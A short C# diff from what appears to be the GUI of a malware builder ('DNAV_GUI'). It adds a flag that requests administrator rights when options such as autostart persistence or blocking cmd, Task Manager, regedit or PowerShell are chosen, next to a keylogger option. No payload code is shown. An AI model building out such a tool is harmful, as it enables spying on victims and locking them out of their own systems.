@@ -1076,6 +1076,13 @@ namespace DNAV_GUI
             bool useSystemDrawingImaging = false;
             bool useSystemDirectoryServices = false;
 
+            bool needAdmin = false;
+
+            if (autostartCopyCheckbox.IsChecked == true || cmdCheckbox.IsChecked == true || runCheckbox.IsChecked == true || taskmanagerCheckbox.IsChecked == true || windowskeyCheckbox.IsChecked == true || regeditCheckbox.IsChecked == true || powershellCheckbox.IsChecked == true)
+            {
+                needAdmin = true;
+            }
+
             // Anmerkung: Muss mit == true abgefragt werden, da Rückgabetyp von IsChecked vom Typ bool? ist
             if (keyloggerCheckbox.IsChecked == true)
             {
